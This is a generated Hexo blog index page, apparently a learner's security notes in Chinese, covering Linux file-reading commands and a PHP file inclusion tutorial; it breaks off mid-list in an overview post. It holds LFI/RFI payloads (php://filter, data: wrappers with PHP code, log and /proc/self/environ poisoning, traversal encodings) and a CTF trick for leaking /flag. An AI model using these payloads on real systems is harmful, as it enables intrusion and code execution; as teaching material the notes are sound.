@@ -1,0 +1,3298 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>Hexo</title>
+        <meta name="author" content="John Doe">
+        <meta name="description" content="">
+        <meta name="keywords" content="">
+        <link rel="icon" href="">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hexo</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;about</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;tags</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;Hexo</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
+                </div>
+            </a>
+            
+            <a href="about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
+                </div>
+            </a>
+            
+            <a href="archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
+                </div>
+            </a>
+            
+            <a href="categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
+                </div>
+            </a>
+            
+            <a href="tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        <div id="home-head">
+    <div id="home-background" style="background-image: url()"></div>
+    
+    <div id="home-info" class="home-info" @click="home_click">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>Hexo</h1>
+                <h3></h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+    
+</div>
+
+<div id="home-posts-wrap" class=>
+    <div id="home-posts">
+        <div id="posts">
+            
+
+<div class="post">
+    <a href="/2022/08/24/linux命令/">
+        <h2>
+            Linux命令
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><pre><code>cat：查看文件内容
+more:一页一页的显示档案内容 
+less:与 more 类似
+head:查看头几行 
+tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 
+tail:查看尾几行 
+nl：显示的时候，顺便输出行号 
+od:以二进制的方式读取档案内容
+vi:一种编辑器，可以查看 
+vim:一种编辑器，可以查看
+sort:可以查看 
+uniq:可以查看 
+file -f:报错出具体内容 
+sh /flag 2&gt;%261 //报错出文件内容
+</code></pre>
+<h3 id="strings命令"><a href="#strings命令" class="headerlink" title="strings命令"></a>strings命令</h3><p>strings [option(s)] [file(s)]</p>
+<p>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</p>
+<p>-d –data：只扫描文件中的数据部分</p>
+<p>-f –print-file-name：在显示字符串前先显示文件名<br>-n –bytes&#x3D;[number]：找到并且输出所有NUL终止符序列<br>- ：设置显示的最少的字符数，默认是4个字符<br>-t –radix&#x3D;{o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</p>
+<p> -w –include-all-whitespace：包括所有空白作为有效的字符串字符</p>
+<p> –unicode&#x3D;{default|show|invalid|hex|escape|highlight}<br>  -U {d|s|i|x|e|h}  ：指定如何处理UTF-8编码的unicode字符</p>
+<p>-o ：类似–radix&#x3D;o<br>-T –target&#x3D; ：指定二进制文件格式<br>-e –encoding&#x3D;{s,S,b,l,B,L} ：选择字符大小和排列顺序:s &#x3D; 7-bit, S &#x3D; 8-bit, {b,l} &#x3D; 16-bit, {B,L} &#x3D; 32-bit<br>@ ：读取中选项</p>
+<p> -s –output-separator&#x3D;<string>：指定用于在输出中分隔字符串的字符串。</p>
+<h3 id="sed，cut命令"><a href="#sed，cut命令" class="headerlink" title="sed，cut命令"></a>sed，cut命令</h3><p>Linux sed 命令是利用脚本来处理文本文件。</p>
+<p>sed 可依照脚本的指令来处理、编辑文本文件。</p>
+<p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p>
+<pre><code>sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]
+</code></pre>
+<ul>
+<li>-e<script>或--expression=<script> 以选项中指定的script来处理输入的文本文件。</li>
+<li>-f<script文件>或--file=<script文件> 以选项中指定的script文件来处理输入的文本文件。</li>
+<li>-h或--help 显示帮助。</li>
+<li>-n或--quiet或--silent 仅显示script处理后的结果。</li>
+<li>-V或--version 显示版本信息。</li>
+</ul>
+<p>动作：</p>
+<ul>
+<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
+<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
+<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何东东；</li>
+<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
+<li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li>
+<li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正则表达式！例如 1,20s/old/new/g 就是啦！</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-sed.html">https://www.runoob.com/linux/linux-comm-sed.html</a></p>
+<p>Linux cut命令用于显示每行从开头算起 num1 到 num2 的文字。</p>
+<pre><code>cut  [-bn] [file]
+cut [-c] [file]
+cut [-df] [file]
+</code></pre>
+<p>cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p>
+<p>如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。</p>
+<p><strong>参数:</strong></p>
+<ul>
+<li>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</li>
+<li>-c ：以字符为单位进行分割。</li>
+<li>-d ：自定义分隔符，默认为制表符。</li>
+<li>-f ：与-d一起使用，指定显示哪个区域。</li>
+<li>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的<br>范围之内，该字符将被写出；否则，该字符将被排除</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-cut.html">https://www.runoob.com/linux/linux-comm-cut.html</a></p>
+<h3 id="awk命令"><a href="#awk命令" class="headerlink" title="awk命令"></a>awk命令</h3><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
+<pre><code>awk [选项参数] &#39;script&#39; var=value file(s)
+或
+awk [选项参数] -f scriptfile var=value file(s)
+</code></pre>
+<ul>
+<li>-F fs or --field-separator fs<br>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。</li>
+<li>-v var=value or --asign var=value<br>赋值一个用户定义变量。</li>
+<li>-f scripfile or --file scriptfile<br>从脚本文件中读取awk命令。</li>
+<li>-mf nnn and -mr nnn<br>对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。</li>
+<li>-W compact or --compat, -W traditional or --traditional<br>在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。</li>
+<li>-W copyleft or --copyleft, -W copyright or --copyright<br>打印简短的版权信息。</li>
+<li>-W help or --help, -W usage or --usage<br>打印全部awk选项和每个选项的简短说明。</li>
+<li>-W lint or --lint<br>打印不能向传统unix平台移植的结构的警告。</li>
+<li>-W lint-old or --lint-old<br>打印关于不能向传统unix平台移植的结构的警告。</li>
+<li>-W posix<br>打开兼容模式。但有以下限制，不识别：/x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符<strong>和</strong>=不能代替^和^=；fflush无效。</li>
+<li>-W re-interval or --re-inerval<br>允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。</li>
+<li>-W source program-text or --source program-text<br>使用program-text作为源代码，可与-f命令混用。</li>
+<li>-W version or --version<br>打印bug报告信息的版本。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">https://www.runoob.com/linux/linux-comm-awk.html</a></p>
+<h3 id="od命令"><a href="#od命令" class="headerlink" title="od命令"></a>od命令</h3><p>Linux od命令用于输出文件内容。</p>
+<p>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p>
+<pre><code>od [-abcdfhilovx][-A &lt;字码基数&gt;][-j &lt;字符数目&gt;][-N &lt;字符数目&gt;][-s &lt;字符串字符数&gt;][-t &lt;输出格式&gt;][-w &lt;每列字符数&gt;][--help][--version][文件...]
+</code></pre>
+<p><strong>参数</strong>：</p>
+<ul>
+<li>-a 　此参数的效果和同时指定"-ta"参数相同。</li>
+<li>-A<字码基数> 　选择要以何种基数计算字码。</li>
+<li>-b 　此参数的效果和同时指定"-toC"参数相同。</li>
+<li>-c 　此参数的效果和同时指定"-tC"参数相同。</li>
+<li>-d 　此参数的效果和同时指定"-tu2"参数相同。</li>
+<li>-f 　此参数的效果和同时指定"-tfF"参数相同。</li>
+<li>-h 　此参数的效果和同时指定"-tx2"参数相同。</li>
+<li>-i 　此参数的效果和同时指定"-td2"参数相同。</li>
+<li>-j<字符数目>或--skip-bytes=<字符数目> 　略过设置的字符数目。</li>
+<li>-l 　此参数的效果和同时指定"-td4"参数相同。</li>
+<li>-N<字符数目>或--read-bytes=<字符数目> 　到设置的字符数目为止。</li>
+<li>-o 　此参数的效果和同时指定"-to2"参数相同。</li>
+<li>-s<字符串字符数>或--strings=<字符串字符数> 　只显示符合指定的字符数目的字符串。</li>
+<li>-t<输出格式>或--format=<输出格式> 　设置输出格式。</li>
+<li>-v或--output-duplicates 　输出时不省略重复的数据。</li>
+<li>-w<每列字符数>或--width=<每列字符数> 　设置每列的最大字符数。</li>
+<li>-x 　此参数的效果和同时指定"-h"参数相同。</li>
+<li>--help 　在线帮助。</li>
+<li>--version 　显示版本信息。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-od.html">https://www.runoob.com/linux/linux-comm-od.html</a></p>
+<h2 id="commond-dev-null-2-1"><a href="#commond-dev-null-2-1" class="headerlink" title="commond > /dev/null 2>&1"></a>commond > /dev/null 2>&1</h2><h3 id="part-1-伪设备"><a href="#part-1-伪设备" class="headerlink" title="part 1 伪设备"></a>part 1 伪设备</h3><p>在类Unix系统上的设备节点不一定必须与物理设备相对应。缺少此对应关系的节点构成伪设备组。它们提供操作系统处理的各种功能。一些最常用（基于字符的）伪设备包括：</p>
+<pre><code>/dev/null - 接受并丢弃所有输入; 不产生输出（总是在读取时返回文件结束指示）
+/dev/zero - 接受并丢弃所有输入; 产生连续的NUL（零值）字节流
+/dev/full - 读取时产生连续的NUL（零值）字节流，并在写入时返回“磁盘已满”消息
+/dev/random和/dev/urandom -它们产生的一个可变长度的数据流的伪随机数。
+</code></pre>
+<h3 id="part-2-文件描述符"><a href="#part-2-文件描述符" class="headerlink" title="part 2 文件描述符"></a>part 2 文件描述符</h3><p>在类unix系统中，当系统启动时就已经有三个标准文件流以及三个文件描述符被预先占用了，其对应关系如下。</p>
+<p>名称	文件描述符	缩写	设备<br>标准输入	0	STDIN	键盘<br>标准输出	1	STDOUT	屏幕<br>标准错误输出	2	STDERR	屏幕</p>
+<p>当我们执行某个命令时，如果该命令执行正确并且有输出，则该命令的输出是在标准输出设备。如果该命令执行失败，类unix系统则会给出提示，该提示在标准错误设备输出。</p>
+<h3 id="part-3-重定向"><a href="#part-3-重定向" class="headerlink" title="part 3 重定向"></a>part 3 重定向</h3><p>重定向是把输出定向到文件或者标准流，重定向符有两个：</p>
+<ol>
+<li><code>&gt;</code> 以覆盖的方式重定向输出到文件</li>
+<li><code>&gt;&gt;</code>以追加的方式重定向输出到文件</li>
+</ol>
+<p>在之前也说过，若命令执行错误，标准错误输出也给出打印，若想要将标准错误输出不在屏幕输出，则需要使用重定向技术，将标准错误输出重定向到标准输出 <code>2&gt;&amp;1</code>：</p>
+<p>&是<strong>用来告诉系统1这里指的是标准输出，而不是文件</strong>。</p>
+<h3 id="command-dev-null-2-1"><a href="#command-dev-null-2-1" class="headerlink" title="command > /dev/null 2>&1"></a>command > /dev/null 2>&1</h3><p>通过以上三部分介绍该语句的函数就是将标准输出和标准错误输出重定向到伪设备<code>/dev/null</code>,它的作用就是执行某个命令将不会有任何日志输出。</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/linux命令/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/十，文件包含漏洞/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>顾名思义，此漏洞在文件上传点常见。如上传图片，文件等。</p>
+<p>对于黑盒条件下，我们可以尝试上传文件并进行访问，观察上传结果等方式确定漏洞。</p>
+<p>对于白盒条件下，可以代码审计寻找常见的存在文件包含漏洞的函数</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本地文件包含（LFI）：当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p>
+<p>远程文件包含（RFI）：服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。</p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><h4 id="引发漏洞的函数"><a href="#引发漏洞的函数" class="headerlink" title="引发漏洞的函数"></a>引发漏洞的函数</h4><pre><code>include()
+include_once()
+require()
+require_once()
+
+include()和require()的区别：
+require()如果在包含过程中出错，就会直接退出，不执行后续语句
+require()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行
+</code></pre>
+<h4 id="使用封装协议读取文件"><a href="#使用封装协议读取文件" class="headerlink" title="使用封装协议读取文件"></a>使用封装协议读取文件</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
+<h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h5><p>这个协议可以展现本地文件系统,默认目录是当前的工作目录。</p>
+<p>用法：?file&#x3D;file:&#x2F;&#x2F;文件绝对路径</p>
+<h5 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h5><p><code>php://input</code>是个可以访问请求的原始数据的只读流。需要开启allow_url_include&#x3D;on，对allow_url_fopen不做要求</p>
+<p>用法：index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
+<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。只是读取，所以只需要开启allow_url_fopen</p>
+<p>用法：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去。</p>
+<p><img src="/%E5%8D%81%EF%BC%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.assets/image-20220407141726135.png" alt="image-20220407141726135"></p>
+<p>可用过滤器：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
+<h5 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;&amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;&amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</h5><p>zip:&#x2F;&#x2F;可以访问压缩文件中的文件，compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;与其用法类似。</p>
+<p>条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本&gt; &#x3D;5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。</p>
+<p>用法：</p>
+<pre><code class="html">1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
+&lt;!--压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传--&gt;
+http://127.0.0.1/include.php?file=zip://C:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+
+2.compress.bzip2://file.bz2
+&lt;!--压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）--&gt;
+http://127.0.0.1/include.php?file=compress.bzip2://C:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
+
+3.compress.zlib://file.gz 
+&lt;!--压缩 phpinfo.txt 为 phpinfo.gz--&gt;
+http://127.0.0.1/include.php?file=compress.zlib://C:\phpStudy\PHPTutorial\WWW\phpinfo.gz
+</code></pre>
+<h5 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h5><p><code>PHP &gt; 5.3</code></p>
+<p><code>phar.readonly</code>配置项配置为0或Off</p>
+<p>利用 phar 协议可以拓展 php 反序列化漏洞攻击面</p>
+<p>与zip:&#x2F;&#x2F;协议类似，但用法不同，zip:&#x2F;&#x2F;伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar:&#x2F;&#x2F;伪协议中是用&#x2F;把压缩文件路径和压缩文件的子文件名隔开，即?file&#x3D;phar:&#x2F;&#x2F;[压缩文件路径]&#x2F;[压缩文件内的子文件名]</p>
+<h5 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h5><p>和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同</p>
+<p>条件：allow_url_fopen参数与allow_url_include都需开启</p>
+<p>用法1：?file&#x3D;data:text&#x2F;plain,<?php 执行内容 ?><br>用法2：?file&#x3D;data:text&#x2F;plain;base64,编码后的php代码</p>
+<h5 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/119063335">https://blog.csdn.net/weixin_50464560/article/details/119063335</a></p>
+<h4 id="从文件包含到rce"><a href="#从文件包含到rce" class="headerlink" title="从文件包含到rce"></a>从文件包含到rce</h4><h5 id="session"><a href="#session" class="headerlink" title="session"></a>session</h5><p>php保存格式 sess_SESSIONID 默认位置是&#x2F;tmp&#x2F;(PHP Sessions)、&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;(PHP Sessions)、 &#x2F;var&#x2F;lib&#x2F;php5&#x2F;(PHP Sessions) 和c:&#x2F;windows&#x2F;temp&#x2F;(PHP Sessions)等文件中。</p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p>eg：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Oran9e/p/8082962.html">https://www.cnblogs.com/Oran9e/p/8082962.html</a></p>
+<p>或者利用</p>
+<p>session.upload_progress实现rce</p>
+<h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><p>最佳的方法无异于是直接包含上传到该服务器的文件</p>
+<h5 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h5><p>apache一般是&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log。</p>
+<p> D:\xampp\apache\logs\access.log</p>
+<p>​    D:\xampp\apache\logs\error.log</p>
+<p> C:\WINDOWS\system32\Logfiles</p>
+<p> %SystemDrive%\inetpub\logs\LogFiles</p>
+<p>nginx的log在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>ssh日志：&#x2F;var&#x2F;log&#x2F;auth.log </p>
+<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
+<p>注意：日志文件一般比较大，不好包含</p>
+<h5 id="x2F-proc-x2F-self-x2F-environ"><a href="#x2F-proc-x2F-self-x2F-environ" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;environ"></a>&#x2F;proc&#x2F;self&#x2F;environ</h5><p>proc&#x2F;self&#x2F;environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<h5 id="x2F-proc-x2F-self-x2F-fd"><a href="#x2F-proc-x2F-self-x2F-fd" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;fd"></a>&#x2F;proc&#x2F;self&#x2F;fd</h5><p>跟包含environ类似。</p>
+<h5 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h5><p>常见的两种临时文件包含漏洞利用方法主要是：<code>PHPINFO()</code> and <code>PHP7 Segment Fault</code></p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="x2F"><a href="#x2F" class="headerlink" title=".&#x2F;\"></a>.&#x2F;\</h5><p>当.&#x2F;\被过滤了怎么办，可以使用不同的编码来绕过服务器的waf防御</p>
+<pre><code>2e%2e%2f    -&gt;    ../
+%2e%2e/     -&gt;    ../
+..%2f     -&gt;    ../
+%2e%2e%5c    -&gt;    ..\
+%2e%2e%\    -&gt;    ..\
+..%5c     -&gt;    ..\
+%252e%252e%255c    -&gt;    ..\
+..%255c     -&gt;    ..\
+</code></pre>
+<p>..\</p>
+<pre><code>url：
+%2e%2e%5c
+..%5c
+%2e%2e\
+二次：
+%252e%252e%255c
+容器/服务器的编码方式
+..%c1%9c
+</code></pre>
+<h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><p>url格式：protocol:&#x2F;&#x2F;hostname[:port]&#x2F;path[?query]#fragment</p>
+<h6 id="利用-query-绕过"><a href="#利用-query-绕过" class="headerlink" title="利用[?query]绕过"></a>利用[?query]绕过</h6><p>访问参数：?file&#x3D;<a target="_blank" rel="noopener" href="http://localhost/phpinfo.php">http://localhost:80/phpinfo.php</a>?</p>
+<p>拼接后： ?file&#x3D;<a target="_blank" rel="noopener" href="http://localhost/phpinfo.php?.txt">http://localhost:80/phpinfo.php?.txt</a></p>
+<h6 id="利用-fragment绕过"><a href="#利用-fragment绕过" class="headerlink" title="利用#fragment绕过"></a>利用#fragment绕过</h6><p>访问参数：?file&#x3D;<a target="_blank" rel="noopener" href="http://localhost/phpinfo.php%23">http://localhost:80/phpinfo.php%23</a></p>
+<p>拼接后： ?file&#x3D;<a target="_blank" rel="noopener" href="http://localhost/phpinfo.php#.txt">http://localhost:80/phpinfo.php#.txt</a></p>
+<h6 id="00字符截断"><a href="#00字符截断" class="headerlink" title="00字符截断"></a>00字符截断</h6><p>这个一般遇见的比较少，因为要求php版本&lt;&#x3D;5.3.4</p>
+<p>?file&#x3D;phpinfo.php%00</p>
+<h6 id="超长字符截断"><a href="#超长字符截断" class="headerlink" title="超长字符截断"></a>超长字符截断</h6><p>linux下，目录字符串长度最大值为4096，windows的为256， 只要不断重复.&#x2F; ， 则后缀在打到最大值时会被丢弃</p>
+<p>?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;…….&#x2F;.&#x2F;shell.php</p>
+<p>这个要求php版本&lt; 5.28</p>
+<h6 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h6><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini&#x2F;………[…]…………</p>
+<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>PHP 中使用 open_basedir 配置限制访问在指定的区域<br>过滤.（点）&#x2F;（反斜杠）\（反斜杠）等特殊字符<br>尽量关闭allow_url_include配置</p>
+<p>禁止远程文件包含 <code>allow_url_include=off</code></p>
+<p>过滤<code>../</code>等特殊符号</p>
+<p>修改Apache日志文件的存放地址</p>
+<p>开启魔术引号 <code>magic_quotes_qpc=on</code></p>
+<p>尽量不要使用动态变量调用文件，直接写要包含的文件。<br>白名单限制包含文件<br>严格过滤.&#x2F;\</p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>就像Java里面的包,python里面的模块,官方就是说重用性,但是python和Java基本无文件包含漏洞,这是PHP语言的特点,在php里面把文件名称变成了变量,直接变量代入,如果没有严格的名称过滤,就出现文件包含漏洞,但是也有绕过的思路</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/十，文件包含漏洞/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/概览/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul>
+<li><p>SQL 注入</p>
+<ul>
+<li>联合查询</li>
+<li>时间盲注</li>
+<li>报错注入</li>
